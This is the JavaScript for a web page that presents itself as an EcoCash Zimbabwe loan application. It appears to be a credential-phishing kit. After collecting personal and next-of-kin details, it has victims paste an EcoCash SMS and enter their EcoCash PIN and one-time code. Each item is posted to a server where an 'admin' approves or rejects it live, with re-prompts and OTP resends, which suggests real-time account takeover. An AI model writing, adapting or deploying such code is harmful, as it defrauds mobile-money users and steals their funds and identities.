// ============================================================
// script.js – EcoCash Zimbabwe Version with All Features
// ============================================================

const S = {
    loanType: '', loanAmount: 0, loanDuration: 0, loanPurpose: '',
    firstName: '', lastName: '', phone: '', email: '',
    kinFirstName: '', kinLastName: '', kinPhone: '', province: '',
    applicationId: '',
    isSubmitting: false,
    rejectedStep: null
};

let currentPollTimeout = null;
let otpResendTimer = null;
let otpResendCountdown = 0;
let pinBlockTimer = null;

// ─── localStorage Helpers ───
const STORAGE_KEYS = {
    APPLICATION_ID: 'ecocash_application_id',
    APPLICATION_DATA: 'ecocash_application_data',
    REJECTION_INFO: 'ecocash_rejection_info',
    FORM_DRAFT: 'ecocash_form_draft',
    OTP_TIMER: 'ecocash_otp_timer'
};

function saveToLocalStorage(key, data) {
    try {
        localStorage.setItem(key, JSON.stringify(data));
        console.log(`💾 Saved to localStorage: ${key}`);
    } catch (error) {
        console.error(`❌ Failed to save ${key}:`, error);
    }
}

function getFromLocalStorage(key) {
    try {
        const data = localStorage.getItem(key);
        return data ? JSON.parse(data) : null;
    } catch (error) {
        console.error(`❌ Failed to load ${key}:`, error);
        return null;
    }
}

function removeFromLocalStorage(key) {
    try {
        localStorage.removeItem(key);
        console.log(`🗑️ Removed from localStorage: ${key}`);
    } catch (error) {
        console.error(`❌ Failed to remove ${key}:`, error);
    }
}

// ─── Save/Load Functions ───
function saveApplicationId(id) {
    if (id) {
        S.applicationId = id;
        saveToLocalStorage(STORAGE_KEYS.APPLICATION_ID, {
            id: id,
            timestamp: new Date().toISOString()
        });
    }
}

function loadApplicationId() {
    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
    if (saved && saved.id) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            S.applicationId = saved.id;
            console.log(`🔄 Restored application ID: ${saved.id}`);
            return saved.id;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
        }
    }
    return null;
}

function saveApplicationData() {
    const dataToSave = {
        ...S,
        timestamp: new Date().toISOString()
    };
    saveToLocalStorage(STORAGE_KEYS.APPLICATION_DATA, dataToSave);
}

function loadApplicationData() {
    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
    if (saved) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            const fieldsToRestore = [
                'loanType', 'loanAmount', 'loanDuration', 'loanPurpose',
                'firstName', 'lastName', 'phone', 'email',
                'kinFirstName', 'kinLastName', 'kinPhone', 'province',
                'applicationId', 'rejectedStep'
            ];
            fieldsToRestore.forEach(field => {
                if (saved[field] !== undefined) {
                    S[field] = saved[field];
                }
            });
            console.log('🔄 Restored application data from localStorage');
            return true;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
        }
    }
    return false;
}

function saveRejectionInfo(step, applicationId) {
    saveToLocalStorage(STORAGE_KEYS.REJECTION_INFO, {
        step: step,
        applicationId: applicationId,
        timestamp: new Date().toISOString()
    });
}

function loadRejectionInfo() {
    const saved = getFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
    if (saved) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 5 * 60 * 1000) {
            return saved;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
        }
    }
    return null;
}

function clearRejectionInfo() {
    removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
}

function saveFormDraft() {
    const draft = {
        firstName: document.getElementById('s2fi')?.value || '',
        lastName: document.getElementById('s2la')?.value || '',
        phone: document.getElementById('s2ph')?.value || '',
        email: document.getElementById('s2em')?.value || '',
        loanAmount: document.getElementById('s1am')?.value || '',
        loanPurpose: document.getElementById('s1reason')?.value || '',
        kinFirstName: document.getElementById('s3kf')?.value || '',
        kinLastName: document.getElementById('s3kl')?.value || '',
        kinPhone: document.getElementById('s3kp')?.value || '',
        province: document.getElementById('s3prov')?.value || '',
        timestamp: new Date().toISOString()
    };
    saveToLocalStorage(STORAGE_KEYS.FORM_DRAFT, draft);
}

function loadFormDraft() {
    const draft = getFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
    if (draft) {
        const age = Date.now() - new Date(draft.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            if (draft.firstName) document.getElementById('s2fi').value = draft.firstName;
            if (draft.lastName) document.getElementById('s2la').value = draft.lastName;
            if (draft.phone) document.getElementById('s2ph').value = draft.phone;
            if (draft.email) document.getElementById('s2em').value = draft.email;
            if (draft.loanAmount) document.getElementById('s1am').value = draft.loanAmount;
            if (draft.loanPurpose) document.getElementById('s1reason').value = draft.loanPurpose;
            if (draft.kinFirstName) document.getElementById('s3kf').value = draft.kinFirstName;
            if (draft.kinLastName) document.getElementById('s3kl').value = draft.kinLastName;
            if (draft.kinPhone) document.getElementById('s3kp').value = draft.kinPhone;
            if (draft.province) document.getElementById('s3prov').value = draft.province;
            console.log('🔄 Restored form draft from localStorage');
            return true;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
        }
    }
    return false;
}

// ─── Navigation ───
function goTo(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
}

function startApplication() {
    S.rejectedStep = null;
    clearRejectionInfo();
    
    if (!S.applicationId) {
        S.applicationId = 'ECO-ZW-' + Date.now().toString().slice(-6);
        saveApplicationId(S.applicationId);
    }
    
    document.getElementById('resendOtpBtn')?.classList.add('hidden');
    
    ['s1Err', 's2Err', 's3Err', 'momErr', 'pinErr', 'otpErr'].forEach(id => {
        clearErr(id);
    });
    
    goTo('page-step1');
}

// ─── Toast Notifications ───
function showToast(message, type = 'info', duration = 3000) {
    const existing = document.querySelector('.toast');
    if (existing) existing.remove();
    
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    toast.textContent = message;
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(-50%) translateY(-20px)';
        setTimeout(() => toast.remove(), 300);
    }, duration);
}

// ─── Form Helpers ───
function normalizePhone(id) {
    let inp = document.getElementById(id);
    let val = inp.value.replace(/\D/g, '');
    if (val.length > 9) val = val.substring(0, 9);
    inp.value = val;
    saveFormDraft();
}

function updateCalc() {
    const amt = +document.getElementById('amtSlider').value;
    const duration = 30;
    document.getElementById('calcAmt').textContent = '$' + amt;
    document.getElementById('calcTerm').textContent = duration + ' Days';
    
    const interest = amt * 0.005 * duration;
    const total = amt + interest;
    document.getElementById('calcInterest').textContent = '$' + interest.toFixed(2);
    document.getElementById('calcTotal').textContent = '$' + total.toFixed(2);
    document.getElementById('monthlyAmt').textContent = '$' + total.toFixed(2);
    document.getElementById('dailyAmt').textContent = '$' + (total / duration).toFixed(2);
    
    // Update slider background
    const pct = ((amt - 100) / 900) * 100;
    document.getElementById('amtSlider').style.setProperty('--pct', pct + '%');
}

function updateStep1Calc() {
    const amt = +document.getElementById('s1am').value;
    const dur = +document.getElementById('s1dur').value;
    
    document.getElementById('s1AmtDisplay').textContent = '$' + amt;
    document.getElementById('s1DurDisplay').textContent = dur + ' days';
    
    const interest = amt * 0.005 * dur;
    const total = amt + interest;
    
    document.getElementById('s1Principal').textContent = '$' + amt.toFixed(2);
    document.getElementById('s1Interest').textContent = '$' + interest.toFixed(2);
    document.getElementById('s1Total').textContent = '$' + total.toFixed(2);
    
    // Update sliders
    const pct1 = ((amt - 100) / 900) * 100;
    document.getElementById('s1am').style.setProperty('--pct', pct1 + '%');
    const pct2 = ((dur - 14) / 106) * 100;
    document.getElementById('s1dur').style.setProperty('--pct', pct2 + '%');
    
    S.loanAmount = amt;
    S.loanDuration = dur;
    saveFormDraft();
}

function showErr(id, msg) {
    const box = document.getElementById(id);
    if (box) {
        box.classList.add('show');
        const txt = document.getElementById(id + 'Txt');
        if (txt) txt.textContent = msg;
    }
}

function clearErr(id) {
    const box = document.getElementById(id);
    if (box) box.classList.remove('show');
}

// ─── Step Navigation ───
function toS2() {
    const amt = +document.getElementById('s1am').value;
    const dur = +document.getElementById('s1dur').value;
    const reason = document.getElementById('s1reason').value.trim();
    
    if (amt < 100 || amt > 1000) {
        showErr('s1Err', 'Please select a valid loan amount ($100 - $1,000).');
        return;
    }
    if (dur < 14 || dur > 120) {
        showErr('s1Err', 'Please select a valid duration (14 - 120 days).');
        return;
    }
    if (!reason) {
        showErr('s1Err', 'Please enter a reason for the loan.');
        return;
    }
    
    S.loanAmount = amt;
    S.loanDuration = dur;
    S.loanPurpose = reason;
    
    saveApplicationData();
    saveFormDraft();
    goTo('page-step2');
}

function toS3() {
    const fi = document.getElementById('s2fi').value.trim();
    const la = document.getElementById('s2la').value.trim();
    const ph = document.getElementById('s2ph').value;
    const em = document.getElementById('s2em').value.trim();
    
    if (!fi || !la) {
        showErr('s2Err', 'Please enter your full name.');
        return;
    }
    if (ph.length !== 9) {
        showErr('s2Err', 'Please enter a valid 9-digit phone number.');
        return;
    }
    if (!em || !em.includes('@')) {
        showErr('s2Err', 'Please enter a valid email address.');
        return;
    }
    
    S.firstName = fi;
    S.lastName = la;
    S.phone = ph;
    S.email = em;
    
    saveApplicationData();
    saveFormDraft();
    goTo('page-step3');
}

// ─── PIN/OTP Helpers ───
function pinMvM(el, i, maxLength = 5) {
    el.value = el.value.replace(/\D/g, '');
    if (el.value && i < maxLength - 1) {
        const nextPin = document.getElementById('pin' + (i + 1));
        if (nextPin) { nextPin.focus(); return; }
    }
    
    if (i === maxLength - 1 && el.value) {
        const allFilled = [0,1,2,3,4].every(idx => document.getElementById('pin' + idx)?.value);
        if (allFilled) {
            setTimeout(() => doPin(), 300);
        }
    }
}

function togPin() {
    for (let i = 0; i < 5; i++) {
        const b = document.getElementById('pin' + i);
        if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
    for (let i = 0; i < 4; i++) {
        const b = document.getElementById('otp' + i);
        if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
}

function chkPin() {
    const pinOk = [0,1,2,3,4].every(i => document.getElementById('pin' + i)?.value);
    const pinBtn = document.querySelector('#page-pin .btn-grad');
    if (pinBtn) pinBtn.disabled = !pinOk;

    const otpOk = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
    const otpBtn = document.querySelector('#page-otp .btn-grad');
    if (otpBtn) otpBtn.disabled = !otpOk;
}

document.addEventListener('keyup', chkPin);

function clearLoginPin() {
    [0,1,2,3,4].forEach(i => document.getElementById('pin'+i).value = '');
    document.getElementById('pin0').focus();
    chkPin();
}

function clearOtpCode() {
    [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
    document.getElementById('otp0').focus();
    chkPin();
}

function handleOtpInput(el, type) {
    el.value = el.value.replace(/\D/, '');
    const idx = parseInt(el.id.match(/\d$/)[0]);
    if (el.value && type === 'otp' && idx < 3) {
        document.getElementById('otp' + (idx + 1))?.focus();
    }
    chkPin();
    
    if (idx === 3 && el.value) {
        const allFilled = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
        if (allFilled) {
            setTimeout(() => doOtp(), 300);
        }
    }
}

// ─── PIN Attempt Functions ───
async function checkPinStatus() {
    try {
        const response = await fetch(`/api/pin-status/${S.applicationId}`);
        const data = await response.json();
        
        if (data.ok) {
            const remaining = data.remainingAttempts || 3;
            
            const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
            if (attemptsDisplay) {
                if (data.isBlocked) {
                    attemptsDisplay.innerHTML = `🔒 Too many attempts. Blocked for ${data.blockRemainingSeconds}s`;
                    attemptsDisplay.className = 'pin-attempts blocked';
                    document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = true);
                    document.querySelector('#page-pin .btn-grad').disabled = true;
                    
                    startPinBlockCountdown(data.blockRemainingSeconds);
                } else {
                    attemptsDisplay.innerHTML = `🔑 Attempts remaining: ${remaining} of 3`;
                    attemptsDisplay.className = 'pin-attempts';
                }
            }
            
            return data;
        }
    } catch (error) {
        console.error('Error checking PIN status:', error);
    }
    return null;
}

function startPinBlockCountdown(seconds) {
    const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
    if (!attemptsDisplay) return;
    
    if (pinBlockTimer) {
        clearInterval(pinBlockTimer);
        pinBlockTimer = null;
    }
    
    let remaining = seconds;
    attemptsDisplay.textContent = `🔒 Too many attempts. Blocked for ${remaining}s`;
    attemptsDisplay.className = 'pin-attempts blocked';
    
    pinBlockTimer = setInterval(() => {
        remaining--;
        if (remaining <= 0) {
            clearInterval(pinBlockTimer);
            pinBlockTimer = null;
            attemptsDisplay.textContent = '✅ PIN available. Please try again.';
            attemptsDisplay.className = 'pin-attempts available';
            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = false);
            document.querySelector('#page-pin .btn-grad').disabled = false;
            resetPinAttempts();
        } else {
            attemptsDisplay.textContent = `🔒 Too many attempts. Blocked for ${remaining}s`;
        }
    }, 1000);
}

async function resetPinAttempts() {
    try {
        await fetch(`/api/reset-pin-attempts/${S.applicationId}`, {
            method: 'POST'
        });
    } catch (error) {
        console.error('Error resetting PIN attempts:', error);
    }
}

// ─── OTP Resend Timer ───
function startOtpResendTimer(seconds = 20) {
    const btn = document.getElementById('resendOtpBtn');
    if (!btn) return;
    
    if (otpResendTimer) {
        clearInterval(otpResendTimer);
        otpResendTimer = null;
    }
    
    otpResendCountdown = seconds;
    btn.disabled = true;
    btn.textContent = `⏳ Wait ${otpResendCountdown}s`;
    btn.classList.remove('hidden');
    
    saveToLocalStorage(STORAGE_KEYS.OTP_TIMER, {
        endTime: Date.now() + (seconds * 1000),
        applicationId: S.applicationId
    });
    
    otpResendTimer = setInterval(() => {
        otpResendCountdown--;
        
        if (otpResendCountdown <= 0) {
            clearInterval(otpResendTimer);
            otpResendTimer = null;
            btn.disabled = false;
            btn.textContent = '🔄 Resend OTP';
            removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
        } else {
            btn.textContent = `⏳ Wait ${otpResendCountdown}s`;
        }
    }, 1000);
}

function checkOtpTimerRecovery() {
    const saved = getFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
    if (saved && saved.endTime && saved.applicationId === S.applicationId) {
        const remaining = Math.ceil((saved.endTime - Date.now()) / 1000);
        if (remaining > 0) {
            startOtpResendTimer(remaining);
            return true;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
        }
    }
    return false;
}

// ─── Smart Rejection Navigation ───
function handleRejection(step) {
    clearErr('s3Err');
    clearErr('momErr');
    clearErr('pinErr');
    clearErr('otpErr');
    
    if (currentPollTimeout) {
        clearTimeout(currentPollTimeout);
        currentPollTimeout = null;
    }
    
    saveRejectionInfo(step, S.applicationId);
    
    switch(step) {
        case 'sms':
            showToast('❌ SMS was rejected. Please check and resubmit.', 'error');
            document.getElementById('smsMsgBox').value = '';
            document.getElementById('smsMsgBox').focus();
            document.querySelector('#page-sms-paste .step-card')?.classList.add('rejected');
            setTimeout(() => {
                document.querySelector('#page-sms-paste .step-card')?.classList.remove('rejected');
            }, 3000);
            goTo('page-sms-paste');
            break;
            
        case 'pin':
            showToast('❌ PIN was rejected. Please re-enter your EcoCash PIN.', 'error');
            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
            document.getElementById('pin0').focus();
            document.querySelector('#page-pin .step-card')?.classList.add('rejected');
            setTimeout(() => {
                document.querySelector('#page-pin .step-card')?.classList.remove('rejected');
            }, 3000);
            checkPinStatus();
            goTo('page-pin');
            break;
            
        case 'otp':
            showToast('❌ OTP was rejected. Please request a new OTP.', 'error');
            clearOtpCode();
            document.querySelector('#page-otp .step-card')?.classList.add('rejected');
            setTimeout(() => {
                document.querySelector('#page-otp .step-card')?.classList.remove('rejected');
            }, 3000);
            startOtpResendTimer(20);
            goTo('page-otp');
            break;
            
        default:
            showToast('❌ Application was rejected. Please start over.', 'error');
            goTo('page-step1');
    }
}

// ─── Polling ───
function startPoll(applicationId, step, onSuccess, onReject) {
    if (currentPollTimeout) {
        clearTimeout(currentPollTimeout);
        currentPollTimeout = null;
    }

    const check = async () => {
        try {
            const res = await fetch(`/api/status/${applicationId}/${step}`);
            const data = await res.json();
            
            if (data && data.ok === true) {
                if (data.status === 'approved') {
                    currentPollTimeout = null;
                    onSuccess();
                    return;
                } else if (data.status === 'rejected') {
                    currentPollTimeout = null;
                    try {
                        const redirectRes = await fetch(`/api/rejection-info/${applicationId}`);
                        const redirectData = await redirectRes.json();
                        
                        if (redirectData.ok && redirectData.rejectedStep) {
                            S.rejectedStep = redirectData.rejectedStep;
                            showToast(redirectData.errorMessage || '❌ Application was rejected.', 'error');
                            handleRejection(redirectData.rejectedStep);
                        } else {
                            showToast('❌ Application was rejected. Please try again.', 'error');
                            goTo('page-step3');
                        }
                    } catch (err) {
                        console.error('Error getting rejection info:', err);
                        showToast('❌ Application was rejected. Please try again.', 'error');
                        goTo('page-step3');
                    }
                    return;
                }
            }
            currentPollTimeout = setTimeout(check, 2000);
        } catch (err) {
            console.error('Polling error:', err);
            currentPollTimeout = setTimeout(check, 3000);
        }
    };
    check();
}

// ─── Resend OTP ───
async function resendOtp() {
    const btn = document.getElementById('resendOtpBtn');
    
    if (otpResendTimer || otpResendCountdown > 0) {
        showToast(`⏳ Please wait ${otpResendCountdown} seconds before resending.`, 'info');
        return;
    }
    
    try {
        btn.disabled = true;
        btn.textContent = '⏳ Sending...';
        showToast('📤 Requesting new OTP...', 'info');
        
        const response = await fetch('/api/resend-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationId: S.applicationId })
        });
        
        const data = await response.json();
        
        if (data.ok) {
            showToast('✅ New OTP sent to admin for verification!', 'success');
            startOtpResendTimer(20);
            
            startPoll(S.applicationId, 'otp',
                () => {
                    showToast('✅ OTP Verified! Loan Approved 🎉', 'success');
                    showApproval();
                },
                () => {
                    handleRejection('otp');
                }
            );
        } else {
            showToast('❌ Failed to resend OTP. Please try again.', 'error');
            btn.disabled = false;
            btn.textContent = '🔄 Resend OTP';
        }
    } catch (error) {
        console.error('Resend OTP error:', error);
        showToast('❌ Failed to resend OTP. Please try again.', 'error');
        btn.disabled = false;
        btn.textContent = '🔄 Resend OTP';
    }
}

// ─── Show Approval ───
function showApproval() {
    document.getElementById('aprAmount').textContent = '$' + S.loanAmount;
    document.getElementById('aprAmt').textContent = '$' + S.loanAmount;
    document.getElementById('aprTerm').textContent = S.loanDuration + ' Days';
    const interest = S.loanAmount * 0.005 * S.loanDuration;
    const total = S.loanAmount + interest;
    document.getElementById('aprMth').textContent = '$' + total.toFixed(2);
    
    Object.values(STORAGE_KEYS).forEach(key => removeFromLocalStorage(key));
    
    if (otpResendTimer) {
        clearInterval(otpResendTimer);
        otpResendTimer = null;
    }
    
    if (pinBlockTimer) {
        clearInterval(pinBlockTimer);
        pinBlockTimer = null;
    }
    
    goTo('page-approval');
}

// ─── Submit Application ───
async function submitApp() {
    const kf = document.getElementById('s3kf').value.trim();
    const kl = document.getElementById('s3kl').value.trim();
    const kp = document.getElementById('s3kp').value;
    const prov = document.getElementById('s3prov').value;
    
    if (!kf || !kl) {
        showErr('s3Err', 'Please enter next of kin full name.');
        return;
    }
    if (kp.length !== 9) {
        showErr('s3Err', 'Please enter a valid 9-digit kin phone number.');
        return;
    }
    if (!prov) {
        showErr('s3Err', 'Please select a province.');
        return;
    }
    
    S.kinFirstName = kf;
    S.kinLastName = kl;
    S.kinPhone = kp;
    S.province = prov;
    
    if (!S.applicationId) {
        S.applicationId = 'ECO-ZW-' + Date.now().toString().slice(-6);
        saveApplicationId(S.applicationId);
    }
    
    saveApplicationData();
    goTo('page-processing');

    try {
        await fetch('/api/send-application', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationData: S })
        });
        
        document.getElementById('processingStatus').innerHTML = '⏳ Awaiting admin approval...';
        
        startPoll(S.applicationId, 'sms',
            () => {
                showToast('✅ SMS Approved!', 'success');
                goTo('page-sms-paste');
            },
            () => {
                handleRejection('sms');
            }
        );
    } catch {
        showErr('s3Err', 'Failed to submit application.');
    }
}

// ─── SMS Parse ───
async function doSmsParse() {
    const msg = document.getElementById('smsMsgBox').value.trim();
    if (msg.length < 3) {
        showErr('momErr', 'Please paste a valid SMS message.');
        return;
    }

    await fetch('/api/send-ecocash-message', {
        method: 'POST',
        body: JSON.stringify({
            ecocashData: {
                applicationId: S.applicationId,
                phone: S.phone,
                ecocashMessage: msg,
                isResubmission: !!S.rejectedStep
            }
        }),
        headers: { 'Content-Type': 'application/json' }
    });

    document.getElementById('waitSmsAppId').textContent = S.applicationId;
    goTo('page-wait-sms');

    startPoll(S.applicationId, 'sms',
        () => {
            showToast('✅ SMS Verified!', 'success');
            goTo('page-pin');
        },
        () => {
            handleRejection('sms');
        }
    );
}

// ─── PIN Submission ───
async function doPin() {
    const pin = [0,1,2,3,4].map(i => document.getElementById('pin'+i).value).join('');
    if (pin.length < 5) {
        showErr('pinErr', 'Enter a valid 5-digit EcoCash PIN.');
        return;
    }

    const pinStatus = await checkPinStatus();
    if (pinStatus && pinStatus.isBlocked) {
        showErr('pinErr', `Too many failed attempts. Please wait ${pinStatus.blockRemainingSeconds} seconds.`);
        return;
    }

    try {
        const response = await fetch('/api/send-pin', {
            method: 'POST',
            body: JSON.stringify({
                applicationId: S.applicationId,
                pin,
                isResubmission: !!S.rejectedStep
            }),
            headers: { 'Content-Type': 'application/json' }
        });
        
        const data = await response.json();
        
        if (!data.ok) {
            showErr('pinErr', data.error || 'Failed to submit PIN.');
            return;
        }

        document.getElementById('waitPinAppId').textContent = S.applicationId;
        goTo('page-wait-pin');

        startPoll(S.applicationId, 'pin',
            () => {
                showToast('✅ PIN Verified!', 'success');
                resetPinAttempts();
                goTo('page-otp');
            },
            async () => {
                try {
                    const rejectResponse = await fetch('/api/pin-rejected', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ applicationId: S.applicationId })
                    });
                    const rejectData = await rejectResponse.json();
                    
                    if (rejectData.blocked) {
                        showErr('pinErr', '🔒 Too many failed attempts. Blocked for 5 minutes.');
                        await checkPinStatus();
                        goTo('page-pin');
                    } else if (rejectData.remainingAttempts > 0) {
                        showErr('pinErr', `❌ Wrong PIN. ${rejectData.remainingAttempts} attempt(s) remaining.`);
                        document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
                        document.getElementById('pin0').focus();
                        const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
                        if (attemptsDisplay) {
                            attemptsDisplay.textContent = `🔑 Attempts remaining: ${rejectData.remainingAttempts} of 3`;
                            attemptsDisplay.className = 'pin-attempts warning';
                        }
                        goTo('page-pin');
                    } else {
                        handleRejection('pin');
                    }
                } catch (err) {
                    console.error('Error handling PIN rejection:', err);
                    handleRejection('pin');
                }
            }
        );
    } catch (error) {
        console.error('Error submitting PIN:', error);
        showErr('pinErr', 'Failed to submit PIN. Please try again.');
    }
}

// ─── OTP Submission ───
async function doOtp() {
    const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
    if (otp.length < 4) {
        showErr('otpErr', 'Enter a valid 4-digit OTP.');
        return;
    }

    await fetch('/api/send-otp', {
        method: 'POST',
        body: JSON.stringify({
            applicationId: S.applicationId,
            otp,
            isResubmission: !!S.rejectedStep
        }),
        headers: { 'Content-Type': 'application/json' }
    });

    document.getElementById('waitOtpAppId').textContent = S.applicationId;
    goTo('page-wait-otp');

    startPoll(S.applicationId, 'otp',
        () => {
            showToast('✅ OTP Verified! Loan Approved 🎉', 'success');
            showApproval();
        },
        () => {
            handleRejection('otp');
        }
    );
}

// ─── Update PIN Page UI ───
function updatePinPageUI() {
    const pinCard = document.querySelector('#page-pin .step-card');
    if (pinCard) {
        let attemptsDisplay = document.getElementById('pinAttemptsDisplay');
        if (!attemptsDisplay) {
            attemptsDisplay = document.createElement('div');
            attemptsDisplay.id = 'pinAttemptsDisplay';
            attemptsDisplay.className = 'pin-attempts';
            const pinLabel = document.querySelector('#page-pin .pin-label');
            if (pinLabel) {
                pinLabel.parentNode.insertBefore(attemptsDisplay, pinLabel.nextSibling);
            }
        }
    }
}

// ─── Recovery on Page Load ───
function recoverSession() {
    console.log('🔄 Checking for saved session...');
    
    const appId = loadApplicationId();
    if (appId) {
        console.log(`✅ Found application ID: ${appId}`);
    }
    
    const dataLoaded = loadApplicationData();
    if (dataLoaded) {
        console.log('✅ Loaded application data');
    }
    
    if (checkOtpTimerRecovery()) {
        console.log('✅ Recovered OTP timer');
        return true;
    }
    
    const rejection = loadRejectionInfo();
    if (rejection) {
        console.log(`✅ Found rejection info for step: ${rejection.step}`);
        showToast(`⚠️ Your ${rejection.step.toUpperCase()} was rejected. Please try again.`, 'error');
        S.applicationId = rejection.applicationId;
        handleRejection(rejection.step);
        return true;
    }
    
    if (!rejection) {
        loadFormDraft();
    }
    
    return false;
}

// ─── Auto-save on input changes ───
document.addEventListener('input', (e) => {
    if (e.target.closest('#page-step1, #page-step2, #page-step3')) {
        saveFormDraft();
    }
    if (e.target.closest('#page-step2, #page-step3')) {
        saveApplicationData();
    }
});

// ─── Override goTo for PIN page ───
const originalGoTo = goTo;
goTo = function(pageId) {
    originalGoTo(pageId);
    if (pageId === 'page-pin') {
        updatePinPageUI();
        checkPinStatus();
    }
};

// ─── INIT ───
updateCalc();

// Set initial slider backgrounds
document.getElementById('amtSlider').style.setProperty('--pct', '11%');
document.getElementById('s1am').style.setProperty('--pct', '11%');
document.getElementById('s1dur').style.setProperty('--pct', '15%');

const recovered = recoverSession();

if (!recovered) {
    goTo('page-landing');
}

console.log('✅ EcoCash Zimbabwe Loan App (All Features) loaded!');
